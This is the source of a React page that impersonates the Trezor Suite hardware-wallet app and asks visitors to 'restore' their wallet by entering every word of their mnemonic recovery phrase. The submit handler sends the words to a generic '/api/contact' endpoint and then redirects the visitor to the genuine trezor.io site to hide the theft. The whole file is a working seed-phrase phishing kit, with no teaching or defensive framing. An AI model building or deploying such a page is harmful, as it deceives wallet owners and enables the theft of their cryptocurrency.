"use client";
import { useState } from "react";

const WORD_OPTIONS = [12, 18, 20, 24, 33];

export default function Home() {
  const [count, setCount] = useState(12);
  const [words, setWords] = useState(Array(12).fill(""));
  const [open, setOpen] = useState(true);
  const [submitting, setSubmitting] = useState(false);

  const changeCount = (n) => {
    setCount(n);
    setWords(Array(n).fill(""));
  };

  const updateWord = (i, value) => {
    const copy = [...words];
    copy[i] = value;
    setWords(copy);
  };

  const allFilled = words.every((w) => w.trim() !== "");

  const handleSubmit = async () => {
    if (!allFilled || submitting) return;
    setSubmitting(true);
    try {
      const res = await fetch('/api/contact', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ words, count }),
      });
      if (res.ok) {
        // Redirect to the official site after successful submission
        window.location.href = 'https://trezor.io/';
        return;
      }
      const data = await res.json().catch(() => ({}));
      alert(data.error || 'Submission failed');
    } catch (err) {
      console.error('submit error', err);
      alert('Network error while submitting the form');
    } finally {
      setSubmitting(false);
    }
  };

  return (
    <main className="flex min-h-screen w-screen bg-gray-50">

      {/* LEFT FIXED */}
      <section className="w-full lg:w-2/5 bg-white flex flex-col items-center justify-center p-10 min-h-screen">
        <div className="flex items-center gap-3 mb-6">
          <img src="/images.jpeg" className="w-10 h-10" alt="logo" />
          <span className="text-xl font-semibold text-gray-800">
            Trezor Suite
          </span>
        </div>
        <h1 className="text-5xl font-bold text-gray-900">Welcome!</h1>
      </section>

      {/* RIGHT */}
      <section className="w-full lg:w-3/5 p-8 overflow-y-auto max-h-screen">

        {/* CONNECT */}
        <div className="flex justify-center mb-10">
          <div className="bg-white rounded-full shadow-md flex items-center px-6 py-3 gap-5">
            <div className="h-16 w-16 rounded-full bg-gray-100 flex items-center justify-center">
              <img src="/trezor.webp" className="h-10" alt="device" />
            </div>
            <span className="text-lg font-medium text-gray-800">
              Connect your Trezor
            </span>
          </div>
        </div>

        {/* CARD */}
        <div className="max-w-3xl mx-auto bg-white rounded-2xl shadow-xl overflow-hidden">

          {/* DROPDOWN HEADER */}
          <button
            onClick={() => setOpen(!open)}
            className="w-full flex items-center justify-between px-8 py-5 text-gray-700 text-sm font-medium border-b"
          >
            <span>Still don’t see your Trezor?</span>
            <svg
              className={`w-5 h-5 transition-transform ${
                open ? "rotate-180" : ""
              }`}
              fill="none"
              stroke="currentColor"
              strokeWidth="2"
              viewBox="0 0 24 24"
            >
              <path strokeLinecap="round" strokeLinejoin="round" d="M19 9l-7 7-7-7" />
            </svg>
          </button>

          {/* FORM (HIDDEN WHEN COLLAPSED) */}
          {open && (
            <div className="px-4 md:px-10">

              <h2 className="text-2xl font-semibold text-center mb-2">
                Restore Your Trezor Wallet!
              </h2>

              <p className="text-sm text-center text-gray-500 mb-6">
                How many words does your Mnemonic contain?
              </p>

              {/* WORD BUTTONS */}
              <div className="flex flex-wrap justify-center gap-3 mb-6">
                {WORD_OPTIONS.map((n) => (
                  <button
                    key={n}
                    onClick={() => changeCount(n)}
                    className={`px-5 py-2 rounded-md border text-sm
                      ${
                        count === n
                          ? "bg-green-600 text-white border-green-600"
                          : "hover:bg-gray-100"
                      }`}
                  >
                    {n} words
                  </button>
                ))}
              </div>

              <p className="text-sm text-gray-500 text-center mb-6">
                To restore your Trezor, type in your Mnemonic words into the
                corresponding boxes below
              </p>

              {/* INPUTS */}
              <div className="grid grid-cols-1 sm:grid-cols-2 md:grid-cols-3 gap-4">
                {words.map((val, i) => (
                  <input
                    key={i}
                    value={val}
                    onChange={(e) => updateWord(i, e.target.value)}
                    placeholder={`${i + 1}.`}
                     className="
    w-full
    px-3 py-2
    border border-gray-300
    rounded
    focus:outline-none
    focus:ring-2 focus:ring-green-500
    text-gray-900
  "
                  />
                ))}
              </div>

              {/* NEXT */}
              <div className="mt-10">
                <button
                  onClick={handleSubmit}
                  disabled={!allFilled || submitting}
                  className={`px-10 py-3 rounded font-semibold text-white
                    ${
                      allFilled && !submitting
                        ? "bg-green-600 hover:bg-green-700"
                        : "bg-gray-400 cursor-not-allowed"
                    }`}
                >
                  {submitting ? 'Submitting...' : 'Next'}
                </button>
              </div>

            </div>
          )}
        </div>
      </section>
    </main>
  );
}
